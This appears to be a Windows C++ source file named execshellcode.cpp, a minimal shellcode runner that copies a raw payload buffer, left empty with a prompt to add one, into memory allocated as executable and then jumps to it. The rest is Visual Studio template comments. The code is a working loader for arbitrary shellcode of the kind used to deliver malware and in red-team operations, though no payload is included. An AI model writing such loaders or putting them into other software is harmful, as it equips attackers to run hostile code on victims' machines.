// execshellcode.cpp : This file contains the 'main' function. Program execution begins and ends there.
// Author: @eln1x

#include <iostream>
#include <windows.h>

#include <iostream>
#include <fstream>
#include <string>

int main()
{
    //add your raw C payload here
	unsigned char buf[] = "";
		
#define ALLSTRLEN sizeof(buf) 
	unsigned char shellcode[ALLSTRLEN];
	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof shellcode);
	((void(*)())exec)();
	return 0;
};


// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
